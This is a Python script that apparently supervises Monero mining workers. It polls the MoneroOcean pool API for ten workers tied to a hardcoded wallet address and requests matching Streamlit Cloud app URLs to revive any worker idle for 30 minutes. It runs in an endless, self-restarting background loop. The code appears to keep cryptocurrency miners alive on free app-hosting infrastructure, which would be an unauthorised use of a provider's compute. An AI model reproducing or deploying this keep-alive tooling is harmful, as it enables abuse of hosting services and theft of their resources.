import requests
import streamlit as st 
import json
import time
from multiprocessing import Process

pool = "https://api.moneroocean.stream/miner/"
addr ="49FrBm432j9fg33N8PrwSiSig7aTrxZ1wY4eELssmkmeESaYzk2fPkvfN7Kj4NHMfH11NuhUAcKc5DkP7jZQTvVGUnD243g"
stats ="/stats/"


def resp(worker):
  
  host = pool + addr + stats + worker
  res = requests.get(host)
  time.sleep(10)
  jde = json.loads(str(res.text))
  workt = jde[("lts")]
  t = time.time()
  lst = t - workt
  lstnt = lst / 60
  if lstnt >= 30:
    #mv4
    if worker == "mv5gen1":
      requests.get("https://vyom00907-mv5-mv5gen1-4bq2p2.streamlit.app/")
    if worker == "mv5gen2":
      requests.get("https://vyom00907-mv5-mv5gen2-uq8kyf.streamlit.app/")
    if worker == "mv5gen3":
      requests.get("https://vyom00907-mv5-mv5gen3-uhqzt0.streamlit.app/")
    if worker == "mv5gen4":
      requests.get("https://vyom00907-mv5-mv5gen4-5n5pdx.streamlit.app/")
    if worker == "mv5gen5":
      requests.get("https://vyom00907-mv5-mv5gen5-s5s5ky.streamlit.app/")
    if worker == "mv5gen6":
      requests.get("https://vyom00907-mv5-mv5gen6-3eul3u.streamlit.app/")
    if worker == "mv5gen7":
      requests.get("https://vyom00907-mv5-mv5gen7-l4127p.streamlit.app/")
    if worker == "mv5gen8":
      requests.get("https://vyom00907-mv5-mv5gen8-cfeevr.streamlit.app/")
    if worker == "mv5gen9":
      requests.get("https://vyom00907-mv5-mv5gen9-4mhrsv.streamlit.app/")
    if worker == "mv5gen10":
      requests.get("https://vyom00907-mv5-mv5gen10-virtcm.streamlit.app/")
    
      

def stch():
    while 1==1 :
      
      #mv4
      resp("mv5gen1")
      resp("mv5gen2")
      resp("mv5gen3")
      resp("mv5gen4")
      resp("mv5gen5")
      resp("mv5gen6")
      resp("mv5gen7")
      resp("mv5gen8")
      resp("mv5gen9")
      resp("mv5gen10")

def ch():
  try:
    stch()
  except:
    ch()

  
proc = Process(target=ch ,args=())
proc.start()

  
